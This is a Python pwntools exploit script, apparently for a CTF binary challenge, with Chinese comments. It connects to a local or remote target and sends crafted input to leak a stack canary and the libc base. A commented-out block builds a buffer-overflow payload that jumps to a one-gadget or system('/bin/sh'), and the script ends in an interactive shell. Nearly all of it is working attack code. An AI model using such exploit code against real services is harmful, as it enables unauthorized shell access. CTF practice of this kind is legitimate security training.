#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./attachment-10"                                   # 本地ELF
    pro_libc = "/lib/x86_64-linux-gnu/libc.so.6"       # Libc文件
    rem_libc = "/lib/x86_64-linux-gnu/libc.so.6"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)


def exp():
    # ru("~")
    # for i in range(8):
    #     sl('1')
    # for i in range(6):
    #     sl('+')
    # for i in range(54-8-6):
    #     sl('1')
    # for i in range(231-53-3-8-8+1+2+1):
    #     sl('1')
    # for i in range(16-1):
    #     sl('+')
    # ru('\x01')
    # rv(7)
    # addr=u64(rv(6).ljust(8,'\x00'))
    # info("addr: "+hex(addr))
    # libc_base=addr-0x18c727+0x17
    # info("libc_base: "+hex(libc_base))
    # system_addr=libc_base+libc.sym['system']
    # info("system_addr: "+hex(system_addr))
    # bin_addr=libc_base+libc.search('/bin/sh').next()
    # info("bin_addr: "+hex(bin_addr))
    # one_addr=libc_base+0x45226
    # info("one_addr: "+hex(one_addr))

    # rv(0x3)
    # rv(0xc0)
    # rv(0x7)
    # canary=int(hex(u64(rv(8)))[:-1],16)*0x10
    # info("canary: "+hex(canary))
        
    # payload='a'*0xd8+p64(canary)+'a'*0x8+p64(one_addr)
    # sl(payload)
    ru("~")
    for i in range(144):
        sl('1')
    debug()
    for i in range(6):
        sl('+')
    for i in range(216-120-6-7-16):
        sl('1')
    for i in range(15):
        sl('+')
    ru("\n")
    rv(0x9f)
    addr=u64(rv(0x6).ljust(8,'\x00'))
    info("addr:%s"%hex(addr))
    rv(0xb)
    rv(0x30)
    rv(0x7)
    canary=int(hex(u64(rv(0x8)))[:-1],16)*0x10
    info("canary:%s"%hex(canary))
    libc_base=addr-libc.sym['_IO_2_1_stderr_']
    info("libc_base:%s"%hex(libc_base))

if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

